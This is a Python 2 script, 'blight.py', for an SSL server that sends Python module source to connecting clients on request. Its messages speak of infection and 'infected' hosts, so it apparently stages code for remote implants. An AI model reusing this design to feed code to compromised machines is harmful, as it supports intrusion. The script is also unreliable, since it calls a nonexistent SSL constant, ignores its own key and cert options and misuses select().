#!/usr/bin/python
import multiprocessing
import argparse
import select
import base64
import socket
import Queue
import imp
import sys
import ssl
import os

def log(inp, quiet=0):
    try:
        argv.log.write(inp)
    except:
        pass
    if not quiet:
        print inp


class blight():
    
        def __init__(self,laddr,port,strict,keyfile,certfile):
            self.laddr = laddr 
            self.lport = port  
            self.strict = strict
            self.keyfile = keyfile
            self.certfile = certfile
            self.open_conns = []
    

            self.transmission_mode = None

            self.symptoms = {
                "import":self.get_package,
                "set_mode":self.set_transmission_mode
            }

            self.transmission_server()


### Connection handling

        def transmission_server(self):
            #establish connection back or dipset 
            try:
                
                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
                sock.bind((self.laddr,self.lport))
                print "[#.#] Contaigion server started  %s:%d" % (self.laddr,self.lport)
            except Exception as e:
                log("[x.x] Unable to bind to %s:%d" % (self.laddr,self.lport))
                log("[>.>] blight died: %s" % str(e))
                sys.exit(-1)
    
            sock.listen(20)
        
            while True:
                try:
                    cli_sock,cli_addr = sock.accept() 
                    log("[!.!] Connection received from %s:%d" % (cli_addr[0],cli_addr[1]))
                    cli_proc = multiprocessing.Process(target=self.transmit_handler,args=(cli_sock,cli_addr[0],cli_addr[1])) 
                    self.open_conns.append(cli_proc)
                    cli_proc.start()
                except:
                    print "[x.x] Killing all infected..." 
                    for i in self.open_conns:
                        i.terminate()
                    print "[^.^] Hope you enjoyed!"
                    sys.exit()



        def transmit_handler(self,rsock,rhost,rport): 
             comms_sock = ssl.wrap_socket(rsock,keyfile="key.pem",certfile="cert.pem",server_side=True)
             debug_sock = None

             try:
                #Normal operations, don't really care
                mode = ssl.CERT_OPTIONAL
                if self.strict:
                    mode = ssl.CERT_VERIFY

             except Exception as e:
                log("[x.x] Unable to wrap SSL socket %s:%d" % (rhost,rport))
                log("[>.>] blight transmission failed!: %s" % str(e))
                sys.exit(-1)

             try:
                while True:
                    __, inbound, __ = select.select([],[comms_sock],[]) 
                    if inbound:
                        inp = self.get_bytes(comms_sock)
                        if inp:
                            resp = self.inp_handle(inp)
                        if resp:
                            out = self.out_handle(resp)     
                            comms_sock.send(out)
                            resp = ""

             except KeyboardInterrupt:
                log("Connection to %s:%d closed!" % (rhost,rport)) 
                pass

### END Connection handling





### Input and output hooks

        def inp_handle(self,buf):
            buf = buf.split(' ')     
            cmd = buf[0]
            args = buf[1:]

            try:
                resp = self.symptoms[cmd](args) 
            except Exception as e:
                resp = str(e) + "\n" 
            return resp


        
        def out_handle(self,buf):
            if self.transmission_mode:
                buf = self.transmission_mode(buf)
            
            return buf

### END Input and output hooks



#### Definitions of Symptoms        

        def set_transmission_mode(self,mode):
            if mode == "base64":
                self.transmission_mode = base64.b64encode            
            else:
                self.transmission_mode = None


        def get_package(self,package):
            fp,path,desc = imp.find_module(package)
            if fp:
                return fp.read()
            else:
                print "no file found. Prob dir?"
                 

#### END Definitions of Symptoms





### Utility Functions

        def get_bytes(self,sock):
            buf = ""
            sock.settimeout(.2)
            try:
                while True:
                    tmp = sock.recv(4096)

                    if len(tmp):
                        buf+=tmp
                    if len(tmp) < 4096:
                        break
            except:
                pass

            return buf
 

### END Utility Functions

if __name__ == "__main__":

    print "<(X.X)> ~ blight ~ <(x.x)>\r\n"
    print " ~ The fun is infectious   ~"

    progDesc = ("<(x.x)> ~blight.py~ <(x.x)>\r\n"
                "Server for providing remote modules\n")

    argParser = argparse.ArgumentParser(description=progDesc)
    argParser.add_argument("-i","--ipaddr", help="IP to bind to",default="0.0.0.0")
    argParser.add_argument("-p","--port", help="Port to bind to",type=int, default=54189)
    argParser.add_argument("-l","--log", help="Log session details to file")
    argParser.add_argument("-s","--strict",help="Care about ssl cert",action="store_true",default=False)
    argParser.add_argument("-k","--keyfile",help="Specify key (.pem)",default="key.pem")
    argParser.add_argument("-c","--certfile",help="Specify cert (.pem)",default="cert.pem")

    argv = argParser.parse_args()
    p = blight(argv.ipaddr,argv.port,argv.strict,argv.keyfile,argv.certfile)

